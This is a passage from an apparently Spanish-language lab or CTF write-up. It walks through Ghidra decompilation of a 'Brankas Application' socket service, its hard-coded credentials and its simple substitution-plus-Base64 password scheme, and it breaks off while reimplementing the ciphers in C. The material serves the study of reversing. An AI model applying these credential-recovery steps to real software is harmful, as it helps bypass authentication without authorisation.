+</code></pre></div><p>El gestor de la conexión es la siguiente función, que muestra los mensajes y espera a la entrada del usuario. Aquí podemos algunos ver los valores esperados para utilizar el servicio (es decir, <code>Vickry Alfiansyah</code> como nombre completo y <code>T3D83CbJkl1299</code> como código):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>UndefinedFunction_71901a3d</span><span class=mtk1>(</span><span class="mtk8 mtku">SOCKET</span> <span class="mtk9 mtki">param_1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk1>acStack67[</span><span class=mtk6>17</span><span class=mtk1>];</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk1>acStack50[</span><span class=mtk6>10</span><span class=mtk1>];</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>iStack40;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>pcStack36;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>pcStack32;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>iStack28;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>iStack24;</span>
+  <span class=mtk1>SOCKET</span> <span class=mtk1>SStack20;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>pcStack16;</span>
+
+  <span class=mtk8>_puts</span><span class=mtk1>(</span><span class=mtk4>"thread</span> <span class=mtk4>cretead</span><span class=mtk6>\r</span><span class=mtk4>"</span><span class=mtk1>);</span>
+  <span class=mtk1>pcStack16</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>_malloc</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>);</span>
+  <span class=mtk1>SStack20</span> <span class=mtk5>=</span> <span class=mtk1>param_1;</span>
+  <span class=mtk8>_memset</span><span class=mtk1>(pcStack16,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>);</span>
+  <span class=mtk1>iStack24</span> <span class=mtk5>=</span> <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Welcome</span> <span class=mtk4>Brankas</span> <span class=mtk4>Application.</span><span class=mtk6>\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>1d</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>  
+
+  <span class=mtk5>if</span> <span class=mtk1>(iStack24</span> <span class=mtk5>==</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk3>//</span> <span class=mtk3>Error</span> <span class=mtk3>handling</span>
+  <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk5>if</span> <span class=mtk1>(SStack20</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk1>iStack28</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+    <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Username:</span> <span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk6>10</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+    <span class=mtk8>recv</span><span class=mtk1>(SStack20,</span> <span class=mtk1>pcStack16,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+    <span class=mtk8>_strncpy</span><span class=mtk1>(acStack50,</span> <span class=mtk1>pcStack16,</span> <span class=mtk6>10</span><span class=mtk1>);</span>
+    <span class=mtk8>_memset</span><span class=mtk1>(pcStack16,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>);</span>
+    <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Password:</span> <span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk6>10</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+    <span class=mtk8>recv</span><span class=mtk1>(SStack20,</span> <span class=mtk1>pcStack16,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+    <span class=mtk8>_strncpy</span><span class=mtk1>(acStack67,</span> <span class=mtk1>pcStack16,</span> <span class=mtk5>0x</span><span class=mtk6>11</span><span class=mtk1>);</span>
+    <span class=mtk8>_memset</span><span class=mtk1>(pcStack16,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>);</span>
+    <span class=mtk1>iStack28</span> <span class=mtk5>=</span> <span class=mtk8>_login</span><span class=mtk1>(acStack50,</span> <span class=mtk1>acStack67);</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>(iStack28</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+      <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Username</span> <span class=mtk4>or</span> <span class=mtk4>Password</span> <span class=mtk4>incorrect</span><span class=mtk6>\r\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>21</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk8>closesocket</span><span class=mtk1>(SStack20);</span>
+                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
+      <span class=mtk8>ExitThread</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+    <span class=mtk1>}</span>
+
+    <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Login</span> <span class=mtk4>Successfully!</span><span class=mtk6>\r\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>15</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+    <span class=mtk1>pcStack32</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>_malloc</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>50</span><span class=mtk1>);</span>
+    <span class=mtk1>pcStack36</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>_malloc</span><span class=mtk1>(</span><span class=mtk6>100</span><span class=mtk1>);</span>
+
+    <span class=mtk5>while</span> <span class=mtk1>(</span><span class=mtk6>true</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+      <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"FullName:</span> <span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk6>10</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk1>iStack40</span> <span class=mtk5>=</span> <span class=mtk8>recv</span><span class=mtk1>(SStack20,</span> <span class=mtk1>pcStack16,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(iStack40</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>closesocket</span><span class=mtk1>(SStack20);</span>
+                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
+        <span class=mtk8>ExitThread</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk1>}</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(iStack40</span> <span class=mtk5>&lt;</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
+
+      <span class=mtk8>_memset</span><span class=mtk1>(pcStack36,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>100</span><span class=mtk1>);</span>
+      <span class=mtk8>_strncpy</span><span class=mtk1>(pcStack36,</span> <span class=mtk1>pcStack16,</span> <span class=mtk6>100</span><span class=mtk1>);</span>
+      <span class=mtk8>_memset</span><span class=mtk1>(pcStack16,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>);</span>
+      <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>11</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk8>recv</span><span class=mtk1>(SStack20,</span> <span class=mtk1>pcStack16,</span> <span class=mtk5>0x</span><span class=mtk6>400</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk8>_memset</span><span class=mtk1>(pcStack32,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>50</span><span class=mtk1>);</span>
+      <span class=mtk8>_strncpy</span><span class=mtk1>(pcStack32,</span> <span class=mtk1>pcStack16,</span> <span class=mtk5>0x</span><span class=mtk6>50</span><span class=mtk1>);</span>
+      <span class=mtk8>_SaveCreds</span><span class=mtk1>(pcStack32,</span> <span class=mtk1>pcStack36);</span>
+      <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>_strncmp</span><span class=mtk1>(pcStack32,</span> <span class=mtk4>"T3D83CbJkl1299"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>e</span><span class=mtk1>);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Wrong</span> <span class=mtk4>Code</span><span class=mtk6>\r\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>d</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+        <span class=mtk8>closesocket</span><span class=mtk1>(SStack20);</span>
+                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
+        <span class=mtk8>ExitThread</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk1>}</span>
+
+      <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>_strncmp</span><span class=mtk1>(pcStack36,</span> <span class=mtk4>"Vickry</span> <span class=mtk4>Alfiansyah"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>11</span><span class=mtk1>);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk8>send</span><span class=mtk1>(SStack20,</span> <span class=mtk4>"Unlocked</span><span class=mtk6>\r\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>0x</span><span class=mtk6>b</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>);</span>
+        <span class=mtk8>closesocket</span><span class=mtk1>(SStack20);</span>
+                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
+        <span class=mtk8>ExitThread</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
+      <span class=mtk1>}</span>
+    <span class=mtk1>}</span>
+
+    <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>WSAGetLastError</span><span class=mtk1>();</span>
+    <span class=mtk8>_printf</span><span class=mtk1>(</span><span class=mtk4>"Recv</span> <span class=mtk4>failed</span> <span class=mtk4>with</span> <span class=mtk4>error:</span> <span class=mtk6>%d\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>iVar1);</span>
+    <span class=mtk8>closesocket</span><span class=mtk1>(SStack20);</span>
+    <span class=mtk1>iStack24</span> <span class=mtk5>=</span> <span class=mtk6>1</span><span class=mtk1>;</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>return</span> <span class=mtk1>iStack24;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Existe una función llamada <code>_login</code> que se encarga de la autenticación del usuario:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>_login</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">param_1</span><span class=mtk1>,</span> <span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class="mtk9 mtki">param_2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">size_t</span> <span class=mtk1>sVar1;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar2;</span>
+  <span class=mtk1>undefined</span> <span class=mtk1>local_39[</span><span class=mtk6>17</span><span class=mtk1>];</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>local_28;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>local_24;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>local_20;</span>
+  <span class="mtk7 mtki">size_t</span> <span class=mtk1>local_1c;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>local_18;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>local_14;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>local_10;</span>
+
+  <span class=mtk1>local_10</span> <span class=mtk5>=</span> <span class=mtk4>"alfiansyah"</span><span class=mtk1>;</span>
+  <span class=mtk1>local_14</span> <span class=mtk5>=</span> <span class=mtk4>"YXlYeDtsbD98eDtsWms5SyU="</span><span class=mtk1>;</span>
+  <span class=mtk8>_memmove</span><span class=mtk1>(local_39,</span> <span class=mtk1>param_2,</span> <span class=mtk5>0x</span><span class=mtk6>11</span><span class=mtk1>);</span>
+  <span class=mtk1>local_18</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>_encrypt1</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk1>local_39);</span>
+  <span class=mtk1>local_1c</span> <span class=mtk5>=</span> <span class=mtk8>_strlen</span><span class=mtk1>(local_18);</span>
+  <span class=mtk1>local_24</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>_encrypt2</span><span class=mtk1>(local_18,</span> <span class=mtk1>local_1c);</span>
+  <span class=mtk1>local_20</span> <span class=mtk5>=</span> <span class=mtk1>local_24;</span>
+  <span class=mtk1>sVar1</span> <span class=mtk5>=</span> <span class=mtk8>_strlen</span><span class=mtk1>(local_24);</span>
+  <span class=mtk1>local_28</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>_b64_encode</span><span class=mtk1>(local_24,</span> <span class=mtk1>sVar1);</span>
+  <span class=mtk1>iVar2</span> <span class=mtk5>=</span> <span class=mtk8>_strcmp</span><span class=mtk1>(local_10,</span> <span class=mtk1>param_1);</span>
+
+  <span class=mtk5>if</span> <span class=mtk1>((iVar2</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(iVar2</span> <span class=mtk5>=</span> <span class=mtk8>_strcmp</span><span class=mtk1>(local_14,</span> <span class=mtk1>local_28),</span> <span class=mtk1>iVar2</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>))</span> <span class=mtk1>{</span>  
+    <span class=mtk5>return</span> <span class=mtk6>1</span><span class=mtk1>;</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Ahora podemos ver que la contraseña está cifrada con dos funciones <code>encrypt1</code> y <code>encrypt2</code> y después se codifica en Base64.</p><p>Las funciones de cifrado utilizan un algoritmo de sustitución:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">char</span> <span class=mtk5>*</span> <span class=mtk8>_encrypt1</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">param_1</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">param_2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk1>cVar1;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>_Str;</span>
+  <span class="mtk7 mtki">size_t</span> <span class=mtk1>sVar2;</span>
+  <span class="mtk7 mtki">uint</span> <span class=mtk1>local_10;</span>
+
+  <span class=mtk1>_Str</span> <span class=mtk5>=</span> <span class=mtk8>_strdup</span><span class=mtk1>(param_2);</span>
+  <span class=mtk1>sVar2</span> <span class=mtk5>=</span> <span class=mtk8>_strlen</span><span class=mtk1>(_Str);</span>
+
+  <span class=mtk5>for</span> <span class=mtk1>(local_10</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>local_10</span> <span class=mtk5>&lt;</span> <span class=mtk1>sVar2;</span> <span class=mtk1>local_10</span> <span class=mtk5>=</span> <span class=mtk1>local_10</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk5>if</span> <span class=mtk1>((</span><span class=mtk4>'</span> <span class=mtk4>'</span> <span class=mtk5>&lt;</span> <span class=mtk1>_Str[local_10])</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(_Str[local_10]</span> <span class=mtk5>!=</span> <span class=mtk4>'</span><span class=mtk6>\x7f</span><span class=mtk4>'</span><span class=mtk1>))</span> <span class=mtk1>{</span>  
+      <span class=mtk1>cVar1</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span><span class=mtk1>)(_Str[local_10]</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>2f</span><span class=mtk1>);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(_Str[local_10]</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>2f</span> <span class=mtk5>&lt;</span> <span class=mtk5>0x</span><span class=mtk6>7f</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk1>_Str[local_10]</span> <span class=mtk5>=</span> <span class=mtk1>cVar1;</span>
+      <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+        <span class=mtk1>_Str[local_10]</span> <span class=mtk5>=</span> <span class=mtk1>cVar1</span> <span class=mtk5>+</span> <span class=mtk5>-0x</span><span class=mtk6>5e</span><span class=mtk1>;</span>
+      <span class=mtk1>}</span>
+    <span class=mtk1>}</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>return</span> <span class=mtk1>_Str;</span>
+<span class=mtk1>}</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">char</span> <span class=mtk5>*</span> <span class=mtk8>_encrypt2</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">param_1</span><span class=mtk1>,</span> <span class="mtk7 mtki">int</span> <span class="mtk9 mtki">param_2</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">bool</span> <span class=mtk1>bVar1;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>pcVar2;</span>
+  <span class=mtk1>byte</span> <span class=mtk1>local_11;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>local_10;</span>
+
+  <span class=mtk1>pcVar2</span> <span class=mtk5>=</span> <span class=mtk8>_strdup</span><span class=mtk1>(param_1);</span>
+
+  <span class=mtk5>for</span> <span class=mtk1>(local_10</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>local_10</span> <span class=mtk5>&lt;</span> <span class=mtk1>param_2;</span> <span class=mtk1>local_10</span> <span class=mtk5>=</span> <span class=mtk1>local_10</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk1>local_11</span> <span class=mtk5>=</span> <span class=mtk1>param_1[local_10];</span>
+
+    <span class=mtk5>if</span> <span class=mtk1>((local_11</span> <span class=mtk5>&lt;</span> <span class=mtk5>0x</span><span class=mtk6>41</span><span class=mtk1>)</span> <span class=mtk5>||</span> <span class=mtk1>(((</span><span class=mtk5>0x</span><span class=mtk6>5a</span> <span class=mtk5>&lt;</span> <span class=mtk1>local_11</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(local_11</span> <span class=mtk5>&lt;</span> <span class=mtk5>0x</span><span class=mtk6>61</span><span class=mtk1>))</span> <span class=mtk5>||</span> <span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>7a</span> <span class=mtk5>&lt;</span> <span class=mtk1>local_11))))</span> <span class=mtk1>{</span>  
+      <span class=mtk1>pcVar2[local_10]</span> <span class=mtk5>=</span> <span class=mtk1>local_11;</span>
+    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+      <span class=mtk1>bVar1</span> <span class=mtk5>=</span> <span class=mtk1>local_11</span> <span class=mtk5>&lt;</span> <span class=mtk5>0x</span><span class=mtk6>5b</span><span class=mtk1>;</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(bVar1)</span> <span class=mtk1>{</span>
+        <span class=mtk1>local_11</span> <span class=mtk5>=</span> <span class=mtk1>local_11</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>20</span><span class=mtk1>;</span>
+      <span class=mtk1>}</span>
+
+      <span class=mtk1>pcVar2[local_10]</span> <span class=mtk5>=</span> <span class=mtk4>'z'</span> <span class=mtk5>-</span> <span class=mtk1>(local_11</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>9f</span><span class=mtk1>);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(bVar1)</span> <span class=mtk1>{</span>
+        <span class=mtk1>pcVar2[local_10]</span> <span class=mtk5>=</span> <span class=mtk1>pcVar2[local_10]</span> <span class=mtk5>+</span> <span class=mtk5>-0x</span><span class=mtk6>20</span><span class=mtk1>;</span>
+      <span class=mtk1>}</span>
+    <span class=mtk1>}</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>return</span> <span class=mtk1>pcVar2;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>Como la descompilación de Ghidra es un poco rara, decidí escribir estas funciones como se muestra a continuación (<code>encrypt1</code> y <code>encrypt2</code>, respectivamente):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;string.h&gt;</span>
+
+<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span><span class=mtk5>**</span> <span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>i;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>length;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk1>c;</span>
+  <span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class=mtk1>s;</span>
+
+  <span class=mtk1>s</span> <span class=mtk5>=</span> <span class=mtk1>argv[</span><span class=mtk6>1</span><span class=mtk1>];</span>
+  <span class=mtk1>length</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(s);</span>
+
+  <span class=mtk5>for</span> <span class=mtk1>(i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>i</span> <span class=mtk5>&lt;</span> <span class=mtk1>length;</span> <span class=mtk1>i</span><span class=mtk5>++</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>20</span> <span class=mtk5>&lt;</span> <span class=mtk1>s[i]</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>s[i]</span> <span class=mtk5>!=</span> <span class=mtk5>0x</span><span class=mtk6>7f</span><span class=mtk1>)</span> <span class=mtk1>{</span>  
+      <span class=mtk1>c</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span><span class=mtk1>)</span> <span class=mtk1>(s[i]</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>2f</span><span class=mtk1>);</span>
+
+      <span class=mtk5>if</span> <span class=mtk1>(s[i]</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>2f</span> <span class=mtk5>&lt;</span> <span class=mtk5>0x</span><span class=mtk6>7f</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+        <span class=mtk1>s[i]</span> <span class=mtk5>=</span> <span class=mtk1>c;</span>
+      <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+        <span class=mtk1>s[i]</span> <span class=mtk5>=</span> <span class=mtk1>c</span> <span class=mtk5>-</span> <span class=mtk5>0x</span><span class=mtk6>5e</span><span class=mtk1>;</span>
+      <span class=mtk1>}</span>
+    <span class=mtk1>}</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>puts</span><span class=mtk1>(s);</span>
+
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;string.h&gt;</span>
+
+<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">argc</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span><span class=mtk5>**</span> <span class="mtk9 mtki">argv</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+  <span class="mtk7 mtki">_Bool</span> <span class=mtk1>b;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>i;</span>
+  <span class="mtk7 mtki">int</span> <span class=mtk1>length;</span>
+  <span class="mtk7 mtki">char</span> <span class=mtk1>c;</span>
+  <span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class=mtk1>s;</span>
+
+  <span class=mtk1>s</span> <span class=mtk5>=</span> <span class=mtk1>argv[</span><span class=mtk6>1</span><span class=mtk1>];</span>
+  <span class=mtk1>length</span> <span class=mtk5>=</span> <span class=mtk8>strlen</span><span class=mtk1>(s);</span>
+
+  <span class=mtk5>for</span> <span class=mtk1>(i</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span> <span class=mtk1>i</span> <span class=mtk5>&lt;</span> <span class=mtk1>length;</span> <span class=mtk1>i</span><span class=mtk5>++</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk1>c</span> <span class=mtk5>=</span> <span class=mtk1>s[i];</span>
+
